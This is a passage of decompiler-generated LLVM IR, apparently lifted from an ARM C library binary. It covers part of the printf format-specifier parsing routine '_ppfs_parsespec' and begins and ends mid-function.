  store i32 %v2_c4cc.pre-phi, i32* @r2, align 4
  %v4_c4d0 = sdiv i32 %v2_c4cc.pre-phi, 2
  %v5_c4d0 = add i32 %v4_c4d0, add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -38826)
  %v6_c4d0 = inttoptr i32 %v5_c4d0 to i8*
  %v7_c4d0 = load i8, i8* %v6_c4d0, align 1
  %v9_c4d0 = zext i8 %v7_c4d0 to i32
  ret i32 %v9_c4d0

; uselistorder directives
  uselistorder i32 %v2_c4cc.pre-phi, { 1, 0 }
  uselistorder i32 %v1_c4a8, { 1, 0, 3, 4, 2 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -38850), { 1, 0 }
}

define i32 @_ppfs_parsespec(i8* %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp117 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-111 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_c4e4 = load i32, i32* @r4, align 4
  store i32 %v3_c4e4, i32* %stack_var_-36, align 4
  %v6_c4e4 = load i32, i32* @r5, align 4
  %v27_c4e4 = load i32, i32* @lr, align 4
  %v0_c4e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_c4e8 = add i32 %v0_c4e8, 16
  %v2_c4e8 = inttoptr i32 %v1_c4e8 to i32*
  %v3_c4e8 = load i32, i32* %v2_c4e8, align 4
  %v1_c4f0 = and i32 %v3_c4e8, 128
  store i32 %v1_c4f0, i32* @r4, align 4
  %v2_c4f0 = icmp eq i32 %v1_c4f0, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_c4e8, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @lr, align 4
  %v1_c518 = add i32 %v0_c4e8, 24
  %v2_c518 = inttoptr i32 %v1_c518 to i32*
  %v3_c518 = load i32, i32* %v2_c518, align 4
  store i32 %v3_c518, i32* %fp.global-to-local, align 4
  br i1 %v2_c4f0, label %.dec_label_pc_c56c_crit_edge, label %dec_label_pc_c524

.dec_label_pc_c56c_crit_edge:                     ; preds = %entry
  %v2_c51c = inttoptr i32 %v0_c4e8 to i32*
  %v3_c51c = load i32, i32* %v2_c51c, align 4
  store i32 %v3_c51c, i32* %r0.global-to-local, align 4
  %.pre = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_c56c

dec_label_pc_c524:                                ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c534 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_c528

dec_label_pc_c528:                                ; preds = %dec_label_pc_c558.dec_label_pc_c528_crit_edge, %dec_label_pc_c524
  %v1_c538 = phi i32 [ %v1_c548, %dec_label_pc_c558.dec_label_pc_c528_crit_edge ], [ 0, %dec_label_pc_c524 ]
  %v0_c528 = phi i32 [ %v0_c528.pre, %dec_label_pc_c558.dec_label_pc_c528_crit_edge ], [ %v0_c4e8, %dec_label_pc_c524 ]
  %v1_c528 = inttoptr i32 %v0_c528 to i32*
  %v2_c528 = load i32, i32* %v1_c528, align 4
  %v4_c52c = mul i32 %v1_c538, 4
  %v5_c52c = add i32 %v2_c528, %v4_c52c
  store i32 %v5_c52c, i32* %r3.global-to-local, align 4
  %v1_c530 = add i32 %v5_c52c, -4
  %v2_c530 = inttoptr i32 %v1_c530 to i8*
  %v3_c530 = load i8, i8* %v2_c530, align 1
  %v4_c530 = zext i8 %v3_c530 to i32
  store i32 %v4_c530, i32* %r1.global-to-local, align 4
  store i32 %v2_c534, i32* @ip, align 4
  %v2_c538 = add i32 %v1_c538, %v2_c534
  store i32 %v2_c538, i32* %r2.global-to-local, align 4
  %v3_c53c = add i32 %v2_c538, -72
  %v4_c53c = inttoptr i32 %v3_c53c to i8*
  store i8 %v3_c530, i8* %v4_c53c, align 1
  %v0_c540 = load i32, i32* %r3.global-to-local, align 4
  %v1_c540 = add i32 %v0_c540, -4
  %v2_c540 = inttoptr i32 %v1_c540 to i32*
  %v3_c540 = load i32, i32* %v2_c540, align 4
  store i32 %v3_c540, i32* %r3.global-to-local, align 4
  %v0_c544 = load i32, i32* %r1.global-to-local, align 4
  %v9_c544 = icmp eq i32 %v0_c544, %v3_c540
  %v0_c548 = load i32, i32* %r0.global-to-local, align 4
  %v1_c548 = add i32 %v0_c548, 1
  store i32 %v1_c548, i32* %r0.global-to-local, align 4
  br i1 %v9_c544, label %dec_label_pc_c550, label %dec_label_pc_ca14

dec_label_pc_c550:                                ; preds = %dec_label_pc_c528
  %v2_c550 = icmp eq i32 %v3_c540, 0
  br i1 %v2_c550, label %dec_label_pc_c560, label %dec_label_pc_c558

dec_label_pc_c558:                                ; preds = %dec_label_pc_c550
  %tmp182 = icmp ult i32 %v1_c548, 32
  br i1 %tmp182, label %dec_label_pc_c558.dec_label_pc_c528_crit_edge, label %dec_label_pc_c560

dec_label_pc_c558.dec_label_pc_c528_crit_edge:    ; preds = %dec_label_pc_c558
  %v0_c528.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_c528

dec_label_pc_c560:                                ; preds = %dec_label_pc_c558, %dec_label_pc_c550
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c568 = ptrtoint i32* %stack_var_-111 to i32
  store i32 %v2_c568, i32* %r0.global-to-local, align 4
  %v0_c578.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_c56c

dec_label_pc_c56c:                                ; preds = %.dec_label_pc_c56c_crit_edge, %dec_label_pc_c560
  %v3_c5a0.pre-phi = phi i32 [ %.pre, %.dec_label_pc_c56c_crit_edge ], [ %v2_c534, %dec_label_pc_c560 ]
  %v0_c59864 = phi i32 [ %v3_c51c, %.dec_label_pc_c56c_crit_edge ], [ %v2_c568, %dec_label_pc_c560 ]
  %v0_c578 = phi i32 [ ptrtoint (i32* @global_var_24010.405 to i32), %.dec_label_pc_c56c_crit_edge ], [ %v0_c578.pre, %dec_label_pc_c560 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 1784, i32* %r2.global-to-local, align 4
  %v2_c578 = add i32 %v0_c578, -38788
  store i32 %v2_c578, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -4, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v4_c58c = inttoptr i32 %v2_c578 to i8*
  store i8* %v4_c58c, i8** %stack_var_-120, align 4
  br label %dec_label_pc_c598

dec_label_pc_c594:                                ; preds = %.thread20, %dec_label_pc_c6c8
  %v0_c594 = phi i32 [ %v2_c740, %.thread20 ], [ %v0_c6a476, %dec_label_pc_c6c8 ]
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.3, %.thread20 ], [ %stack_var_-44.2, %dec_label_pc_c6c8 ]
  store i32 %v0_c594, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c598

dec_label_pc_c598:                                ; preds = %dec_label_pc_c56c, %dec_label_pc_c594
  %v1_c5ac = phi i32 [ %v0_c59864, %dec_label_pc_c56c ], [ %v0_c594, %dec_label_pc_c594 ]
  %stack_var_-44.1 = phi i32 [ %tmp117, %dec_label_pc_c56c ], [ %stack_var_-44.0, %dec_label_pc_c594 ]
  %v1_c598 = inttoptr i32 %v1_c5ac to i8*
  %v2_c598 = load i8, i8* %v1_c598, align 1
  %v3_c598 = zext i8 %v2_c598 to i32
  store i32 %v3_c598, i32* %r3.global-to-local, align 4
  %v7_c59c = icmp eq i8 %v2_c598, 42
  br i1 %v7_c59c, label %bb, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_c598
  store i32 %v1_c5ac, i32* %r6.global-to-local, align 4
  %v0_c5b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c5b0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c5f8.preheader

bb:                                               ; preds = %dec_label_pc_c598
  %v1_c5a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_c5a4 = load i32, i32* %sb.global-to-local, align 4
  %v4_c5a4 = mul i32 %v2_c5a4, %v1_c5a4
  %v5_c5a4 = add i32 %v4_c5a4, %v3_c5a0.pre-phi
  store i32 %v5_c5a4, i32* %r3.global-to-local, align 4
  %v2_c5ac = add i32 %v1_c5ac, 1
  store i32 %v2_c5ac, i32* %r6.global-to-local, align 4
  %v0_c5b0111 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c5b0111, i32* %r1.global-to-local, align 4
  %v3_c5b4 = add i32 %v5_c5a4, -40
  %v4_c5b4 = inttoptr i32 %v3_c5b4 to i32*
  store i32 %v0_c5b0111, i32* %v4_c5b4, align 4
  %v0_c5fc.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c5f8.preheader

dec_label_pc_c5f8.preheader:                      ; preds = %.thread8, %bb
  %v0_c5fc.pre = phi i32 [ %v1_c5ac, %.thread8 ], [ %v0_c5fc.pre.pre, %bb ]
  %v0_c600.pre = load i32, i32* @lr, align 4
  %v2_c600 = add i32 %v0_c600.pre, 1784
  %v3_c600 = inttoptr i32 %v2_c600 to i32*
  br label %dec_label_pc_c5f8

dec_label_pc_c5bc:                                ; preds = %dec_label_pc_c5f8
  store i32 214748363, i32* %r3.global-to-local, align 4
  %v0_c5c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_c5c0 = add i32 %v0_c5c0, -214748363
  %tmp139 = sub i32 214748362, %v0_c5c0
  %v6_c5c0 = and i32 %tmp139, %v0_c5c0
  %v7_c5c0 = icmp slt i32 %v6_c5c0, 0
  %v8_c5c0 = icmp slt i32 %v2_c5c0, 0
  %v9_c5c0 = icmp eq i32 %v0_c5c0, 214748363
  %v3_c5c4 = xor i1 %v8_c5c0, %v7_c5c0
  %v4_c5c4 = or i1 %v9_c5c0, %v3_c5c4
  br i1 %v4_c5c4, label %dec_label_pc_c5dc, label %dec_label_pc_c5c8

dec_label_pc_c5c8:                                ; preds = %dec_label_pc_c5bc
  store i32 214748364, i32* %r2.global-to-local, align 4
  %v9_c5cc = icmp eq i32 %v0_c5c0, 214748364
  br i1 %v9_c5cc, label %dec_label_pc_c5d4, label %dec_label_pc_c5f4

dec_label_pc_c5d4:                                ; preds = %dec_label_pc_c5c8
  %v8_c5d8 = icmp ugt i8 %v2_c5fc, 55
  br i1 %v8_c5d8, label %dec_label_pc_c5f4, label %dec_label_pc_c5dc

dec_label_pc_c5dc:                                ; preds = %dec_label_pc_c5d4, %dec_label_pc_c5bc
  %v2_c5e0 = mul i32 %v0_c5c0, 10
  %v1_c5e4 = add i32 %v2_c5e0, -48
  store i32 %v1_c5e4, i32* %r3.global-to-local, align 4
  %v2_c5e8 = add i32 %v1_c5e4, %v3_c5fc
  br label %dec_label_pc_c5f4

dec_label_pc_c5f4:                                ; preds = %dec_label_pc_c5d4, %dec_label_pc_c5c8, %dec_label_pc_c5dc
  %storemerge = phi i32 [ %v2_c5e8, %dec_label_pc_c5dc ], [ 2147483647, %dec_label_pc_c5c8 ], [ 2147483647, %dec_label_pc_c5d4 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_c5f4 = add i32 %v0_c67c, 1
  store i32 %v1_c5f4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c5f8

dec_label_pc_c5f8:                                ; preds = %dec_label_pc_c5f8.preheader, %dec_label_pc_c5f4
  %v0_c67c = phi i32 [ %v0_c5fc.pre, %dec_label_pc_c5f8.preheader ], [ %v1_c5f4, %dec_label_pc_c5f4 ]
  store i32 1784, i32* %r2.global-to-local, align 4
  %v1_c5fc = inttoptr i32 %v0_c67c to i8*
  %v2_c5fc = load i8, i8* %v1_c5fc, align 1
  %v3_c5fc = zext i8 %v2_c5fc to i32
  store i32 %v3_c5fc, i32* @ip, align 4
  %v4_c600 = load i32, i32* %v3_c600, align 4
  store i32 %v4_c600, i32* %r3.global-to-local, align 4
  %v2_c604 = mul nuw nsw i32 %v3_c5fc, 2
  store i32 %v2_c604, i32* %r2.global-to-local, align 4
  %v2_c608 = add i32 %v2_c604, %v4_c600
  %v3_c608 = inttoptr i32 %v2_c608 to i16*
  %v4_c608 = load i16, i16* %v3_c608, align 2
  %v6_c608 = zext i16 %v4_c608 to i32
  store i32 %v6_c608, i32* %r3.global-to-local, align 4
  %v1_c60c = and i32 %v6_c608, 8
  %v2_c60c = icmp eq i32 %v1_c60c, 0
  br i1 %v2_c60c, label %dec_label_pc_c614, label %dec_label_pc_c5bc

dec_label_pc_c614:                                ; preds = %dec_label_pc_c5f8
  %v0_c614 = load i32, i32* %r0.global-to-local, align 4
  %v1_c614 = add i32 %v0_c614, -1
  %v2_c614 = inttoptr i32 %v1_c614 to i8*
  %v3_c614 = load i8, i8* %v2_c614, align 1
  %v4_c614 = zext i8 %v3_c614 to i32
  store i32 %v4_c614, i32* %r3.global-to-local, align 4
  %v7_c618 = icmp eq i8 %v3_c614, 37
  br i1 %v7_c618, label %dec_label_pc_c620, label %dec_label_pc_c6e0

dec_label_pc_c620:                                ; preds = %dec_label_pc_c614
  %v7_c620 = icmp eq i8 %v2_c5fc, 36
  %. = zext i1 %v7_c620 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_c62c = load i32, i32* %r1.global-to-local, align 4
  %tmp143 = icmp slt i32 %v0_c62c, 1
  br i1 %tmp143, label %bb144, label %thread-pre-split

bb144:                                            ; preds = %dec_label_pc_c620
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_c620, %bb144
  %v0_c634 = phi i32 [ 0, %bb144 ], [ %., %dec_label_pc_c620 ]
  %v2_c634 = icmp eq i32 %v0_c634, 0
  %v0_c668 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_c634, label %dec_label_pc_c668, label %dec_label_pc_c63c

dec_label_pc_c63c:                                ; preds = %thread-pre-split
  %v2_c668 = icmp eq i32 %v0_c668, 0
  %v1_c640 = add i32 %v0_c67c, 1
  store i32 %v1_c640, i32* %r0.global-to-local, align 4
  br i1 %v2_c668, label %dec_label_pc_ca14, label %dec_label_pc_c648

dec_label_pc_c648:                                ; preds = %dec_label_pc_c63c
  %v2_c648 = sub i32 %v0_c62c, %v0_c668
  %v4_c648 = xor i32 %v0_c668, %v0_c62c
  %v5_c648 = xor i32 %v2_c648, %v0_c62c
  %v6_c648 = and i32 %v5_c648, %v4_c648
  %v7_c648 = icmp slt i32 %v6_c648, 0
  %v8_c648 = icmp slt i32 %v2_c648, 0
  %v9_c648 = icmp eq i32 %v0_c62c, %v0_c668
  %v3_c64c = xor i1 %v8_c648, %v7_c648
  %v4_c64c = or i1 %v9_c648, %v3_c64c
  br i1 %v4_c64c, label %dec_label_pc_c65c, label %bb145

bb145:                                            ; preds = %dec_label_pc_c648
  store i32 %v0_c62c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_c65c

dec_label_pc_c658:                                ; preds = %dec_label_pc_c67c, %dec_label_pc_c684
  %v0_c658 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c658, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_c65c

dec_label_pc_c65c:                                ; preds = %bb145, %dec_label_pc_c648, %dec_label_pc_c658
  %v0_c65c = phi i32 [ %v0_c614, %dec_label_pc_c658 ], [ %v1_c640, %dec_label_pc_c648 ], [ %v1_c640, %bb145 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_c658 ], [ %v0_c62c, %dec_label_pc_c648 ], [ %v0_c62c, %bb145 ]
  store i32 %v0_c65c, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_c698.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_c698 = ptrtoint i8* %v2_c698.pre to i32
  br label %dec_label_pc_c698

dec_label_pc_c668:                                ; preds = %thread-pre-split
  %tmp146 = icmp slt i32 %v0_c668, 1
  br i1 %tmp146, label %dec_label_pc_c67c, label %dec_label_pc_c670

dec_label_pc_c670:                                ; preds = %dec_label_pc_c668
  %v7_c670 = icmp eq i8 %v2_c5fc, 109
  br i1 %v7_c670, label %dec_label_pc_c6e0, label %dec_label_pc_ca14

dec_label_pc_c67c:                                ; preds = %dec_label_pc_c668
  %tmp183 = icmp ugt i32 %v0_c67c, %v0_c614
  br i1 %tmp183, label %dec_label_pc_c684, label %dec_label_pc_c658

dec_label_pc_c684:                                ; preds = %dec_label_pc_c67c
  %v1_c684 = inttoptr i32 %v0_c614 to i8*
  %v2_c684 = load i8, i8* %v1_c684, align 1
  %v3_c684 = zext i8 %v2_c684 to i32
  store i32 %v3_c684, i32* %r3.global-to-local, align 4
  %v7_c688 = icmp eq i8 %v2_c684, 48
  br i1 %v7_c688, label %dec_label_pc_c658, label %bb147

bb147:                                            ; preds = %dec_label_pc_c684
  %v1_c68c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_c68c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_c6e0

dec_label_pc_c698.loopexit:                       ; preds = %dec_label_pc_c6a0
  %v1_c6ac = load i32, i32* @r4, align 4
  %v3_c6ac = or i32 %v1_c6ac, %v0_c6c0
  store i32 %v3_c6ac, i32* @r4, align 4
  %v2_c6b0 = add i32 %v0_c6a476, 1
  store i32 %v2_c6b0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c698

dec_label_pc_c698:                                ; preds = %dec_label_pc_c698.loopexit, %dec_label_pc_c65c
  %v0_c6a476 = phi i32 [ %v2_c6b0, %dec_label_pc_c698.loopexit ], [ %v0_c65c, %dec_label_pc_c65c ]
  store i32 %v3_c698, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_c6a4 = inttoptr i32 %v0_c6a476 to i8*
  br label %dec_label_pc_c6a0

dec_label_pc_c6a0:                                ; preds = %dec_label_pc_c6b8, %dec_label_pc_c698
  %v0_c6c0 = phi i32 [ %v2_c6c0, %dec_label_pc_c6b8 ], [ 1, %dec_label_pc_c698 ]
  %v0_c6a0 = phi i32 [ %v5_c6a0, %dec_label_pc_c6b8 ], [ %v3_c698, %dec_label_pc_c698 ]
  %v1_c6a0 = inttoptr i32 %v0_c6a0 to i8*
  %v2_c6a0 = load i8, i8* %v1_c6a0, align 1
  %v3_c6a0 = zext i8 %v2_c6a0 to i32
  store i32 %v3_c6a0, i32* %r2.global-to-local, align 4
  %v5_c6a0 = add i32 %v0_c6a0, 1
  store i32 %v5_c6a0, i32* %r0.global-to-local, align 4
  %v2_c6a4 = load i8, i8* %v1_c6a4, align 1
  %v3_c6a4 = zext i8 %v2_c6a4 to i32
  store i32 %v3_c6a4, i32* %r3.global-to-local, align 4
  %v9_c6a8 = icmp eq i8 %v2_c6a4, %v2_c6a0
  br i1 %v9_c6a8, label %dec_label_pc_c698.loopexit, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c6a0
  %v1_c6b8 = inttoptr i32 %v5_c6a0 to i8*
  %v2_c6b8 = load i8, i8* %v1_c6b8, align 1
  %v3_c6b8 = zext i8 %v2_c6b8 to i32
  store i32 %v3_c6b8, i32* %r3.global-to-local, align 4
  %v2_c6bc = icmp eq i8 %v2_c6b8, 0
  %v2_c6c0 = mul i32 %v0_c6c0, 2
  store i32 %v2_c6c0, i32* %r1.global-to-local, align 4
  br i1 %v2_c6bc, label %dec_label_pc_c6c8, label %dec_label_pc_c6a0

dec_label_pc_c6c8:                                ; preds = %dec_label_pc_c6b8
  %v1_c6c8 = add i32 %v0_c6a476, -1
  %v2_c6c8 = inttoptr i32 %v1_c6c8 to i8*
  %v3_c6c8 = load i8, i8* %v2_c6c8, align 1
  %v7_c6cc = icmp eq i8 %v3_c6c8, 37
  %v0_c6d0 = load i32, i32* @r4, align 4
  %v1_c6d0 = and i32 %v0_c6d0, 10
  store i32 %v1_c6d0, i32* %r3.global-to-local, align 4
  %v4_c6d4 = udiv i32 %v1_c6d0, 2
  %v5_c6d4 = sub nuw nsw i32 -1, %v4_c6d4
  %v6_c6d4 = and i32 %v0_c6d0, %v5_c6d4
  store i32 %v6_c6d4, i32* @r4, align 4
  br i1 %v7_c6cc, label %dec_label_pc_c6dc, label %dec_label_pc_c594

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c6c8
  %v0_c6dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_c6dc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c6e0

dec_label_pc_c6e0:                                ; preds = %bb147, %dec_label_pc_c614, %dec_label_pc_c670, %dec_label_pc_c6dc
  %v1_c720 = phi i32 [ %v0_c6a476, %dec_label_pc_c6dc ], [ %v0_c67c, %bb147 ], [ %v0_c67c, %dec_label_pc_c670 ], [ %v0_c67c, %dec_label_pc_c614 ]
  %v0_c71c = phi i32 [ %v5_c6a0, %dec_label_pc_c6dc ], [ %v0_c614, %bb147 ], [ %v0_c614, %dec_label_pc_c670 ], [ %v0_c614, %dec_label_pc_c614 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_c6dc ], [ %stack_var_-44.1, %bb147 ], [ %stack_var_-44.1, %dec_label_pc_c670 ], [ %stack_var_-44.1, %dec_label_pc_c614 ]
  %v1_c6e0 = inttoptr i32 %v0_c71c to i8*
  %v2_c6e0 = load i8, i8* %v1_c6e0, align 1
  %v3_c6e0 = zext i8 %v2_c6e0 to i32
  store i32 %v3_c6e0, i32* %r3.global-to-local, align 4
  %v7_c6e4 = icmp eq i8 %v2_c6e0, 42
  br i1 %v7_c6e4, label %dec_label_pc_c6ec, label %dec_label_pc_c72c

dec_label_pc_c6ec:                                ; preds = %dec_label_pc_c6e0
  %v0_c6ec = load i32, i32* %fp.global-to-local, align 4
  %v2_c6ec = icmp eq i32 %v0_c6ec, 0
  br i1 %v2_c6ec, label %dec_label_pc_c71c, label %dec_label_pc_c6f4

dec_label_pc_c6f4:                                ; preds = %dec_label_pc_c6ec
  %v1_c6f4 = inttoptr i32 %v1_c720 to i8*
  %v2_c6f4 = load i8, i8* %v1_c6f4, align 1
  %v3_c6f4 = zext i8 %v2_c6f4 to i32
  store i32 %v3_c6f4, i32* %r3.global-to-local, align 4
  %v7_c6f8 = icmp eq i8 %v2_c6f4, 36
  br i1 %v7_c6f8, label %dec_label_pc_c700, label %dec_label_pc_ca14

dec_label_pc_c700:                                ; preds = %dec_label_pc_c6f4
  %v0_c700 = load i32, i32* %r1.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_c700, 1
  br i1 %tmp148, label %dec_label_pc_ca14, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c700
  %v0_c70c = load i32, i32* %r8.global-to-local, align 4
  %v1_c70c = load i32, i32* %sb.global-to-local, align 4
  %v3_c70c = mul i32 %v1_c70c, %v0_c70c
  %v4_c70c = add i32 %v3_c70c, %v3_c5a0.pre-phi
  store i32 %v4_c70c, i32* %r3.global-to-local, align 4
  %v1_c710 = add i32 %v1_c720, 1
  store i32 %v1_c710, i32* %r6.global-to-local, align 4
  %v2_c714 = add i32 %v4_c70c, -12
  %v3_c714 = inttoptr i32 %v2_c714 to i32*
  store i32 %v0_c700, i32* %v3_c714, align 4
  br label %dec_label_pc_c728

dec_label_pc_c71c:                                ; preds = %dec_label_pc_c6ec
  %v1_c71c = add i32 %v0_c71c, 1
  store i32 %v1_c71c, i32* %r3.global-to-local, align 4
  %v9_c720 = icmp eq i32 %v1_c71c, %v1_c720
  br i1 %v9_c720, label %dec_label_pc_c728, label %dec_label_pc_ca14

dec_label_pc_c728:                                ; preds = %dec_label_pc_c71c, %dec_label_pc_c708
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_c72c

dec_label_pc_c72c:                                ; preds = %dec_label_pc_c6e0, %dec_label_pc_c728
  %v0_c72c = load i32, i32* %r8.global-to-local, align 4
  %v2_c72c = icmp eq i32 %v0_c72c, 0
  br i1 %v2_c72c, label %dec_label_pc_c738, label %dec_label_pc_c758.loopexit

dec_label_pc_c738:                                ; preds = %dec_label_pc_c72c
  %v0_c738 = load i32, i32* %r6.global-to-local, align 4
  %v1_c738 = inttoptr i32 %v0_c738 to i8*
  %v2_c738 = load i8, i8* %v1_c738, align 1
  %v3_c738 = zext i8 %v2_c738 to i32
  store i32 %v3_c738, i32* %r3.global-to-local, align 4
  %v7_c73c = icmp eq i8 %v2_c738, 46
  br i1 %v7_c73c, label %.thread20, label %dec_label_pc_c750

.thread20:                                        ; preds = %dec_label_pc_c738
  %v2_c740 = add i32 %v0_c738, 1
  store i32 %v2_c740, i32* %r6.global-to-local, align 4
  %v1_c744 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_c744, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_c594

dec_label_pc_c750:                                ; preds = %dec_label_pc_c738
  %v0_c750 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_c750, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_c758

dec_label_pc_c758.loopexit:                       ; preds = %dec_label_pc_c72c
  %v1_c730 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_c730, i32* @r5, align 4
  %v0_c764.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c758

dec_label_pc_c758:                                ; preds = %dec_label_pc_c758.loopexit, %dec_label_pc_c750
  %v0_c764.pre = phi i32 [ %v0_c764.pre.pre, %dec_label_pc_c758.loopexit ], [ %v0_c738, %dec_label_pc_c750 ]
  store i32 -38912, i32* %r3.global-to-local, align 4
  %v0_c75c = load i32, i32* @lr, align 4
  %v2_c75c = add i32 %v0_c75c, -38912
  store i32 %v2_c75c, i32* %r1.global-to-local, align 4
  %v1_c764 = inttoptr i32 %v0_c764.pre to i8*
  br label %dec_label_pc_c760

dec_label_pc_c760:                                ; preds = %dec_label_pc_c774, %dec_label_pc_c758
  %v0_c774 = phi i32 [ %v1_c774, %dec_label_pc_c774 ], [ %v2_c75c, %dec_label_pc_c758 ]
  %v1_c760 = inttoptr i32 %v0_c774 to i8*
  %v2_c760 = load i8, i8* %v1_c760, align 1
  %v3_c760 = zext i8 %v2_c760 to i32
  store i32 %v3_c760, i32* %r2.global-to-local, align 4
  %v2_c764 = load i8, i8* %v1_c764, align 1
  %v3_c764 = zext i8 %v2_c764 to i32
  store i32 %v3_c764, i32* %r3.global-to-local, align 4
  %v9_c768 = icmp eq i8 %v2_c764, %v2_c760
  br i1 %v9_c768, label %bb149, label %dec_label_pc_c774

bb149:                                            ; preds = %dec_label_pc_c760
  %v2_c76c = add i32 %v0_c764.pre, 1
  store i32 %v2_c76c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c780

dec_label_pc_c774:                                ; preds = %dec_label_pc_c760
  %v1_c774 = add i32 %v0_c774, 1
  %v2_c774 = inttoptr i32 %v1_c774 to i8*
  %v3_c774 = load i8, i8* %v2_c774, align 1
  %v4_c774 = zext i8 %v3_c774 to i32
  store i32 %v4_c774, i32* %r3.global-to-local, align 4
  store i32 %v1_c774, i32* %r1.global-to-local, align 4
  %v2_c778 = icmp eq i8 %v3_c774, 0
  br i1 %v2_c778, label %dec_label_pc_c780, label %dec_label_pc_c760

dec_label_pc_c780:                                ; preds = %dec_label_pc_c774, %bb149
  %v1_c7a4 = phi i32 [ %v2_c76c, %bb149 ], [ %v0_c764.pre, %dec_label_pc_c774 ]
  %v1_c7a0 = phi i32 [ %v0_c774, %bb149 ], [ %v1_c774, %dec_label_pc_c774 ]
  %v2_c788 = sub i32 %v1_c7a0, %v2_c75c
  store i32 %v2_c788, i32* %r3.global-to-local, align 4
  %v8_c790 = icmp sgt i32 %v2_c788, 1
  br i1 %v8_c790, label %.thread24, label %dec_label_pc_c794

dec_label_pc_c794:                                ; preds = %dec_label_pc_c780
  %v1_c794 = inttoptr i32 %v1_c7a4 to i8*
  %v2_c794 = load i8, i8* %v1_c794, align 1
  %v3_c794 = zext i8 %v2_c794 to i32
  store i32 %v3_c794, i32* %r2.global-to-local, align 4
  %v1_c798 = inttoptr i32 %v1_c7a0 to i8*
  %v2_c798 = load i8, i8* %v1_c798, align 1
  %v3_c798 = zext i8 %v2_c798 to i32
  store i32 %v3_c798, i32* %r3.global-to-local, align 4
  %v9_c79c = icmp eq i8 %v2_c794, %v2_c798
  br i1 %v9_c79c, label %bb150, label %.thread24

bb150:                                            ; preds = %dec_label_pc_c794
  %v2_c7a0 = add i32 %v1_c7a0, 9
  store i32 %v2_c7a0, i32* %r1.global-to-local, align 4
  %v2_c7a4 = add i32 %v1_c7a4, 1
  store i32 %v2_c7a4, i32* %r6.global-to-local, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_c794, %dec_label_pc_c780, %bb150
  %v0_c7ac = phi i32 [ %v1_c7a0, %dec_label_pc_c794 ], [ %v1_c7a0, %dec_label_pc_c780 ], [ %v2_c7a0, %bb150 ]
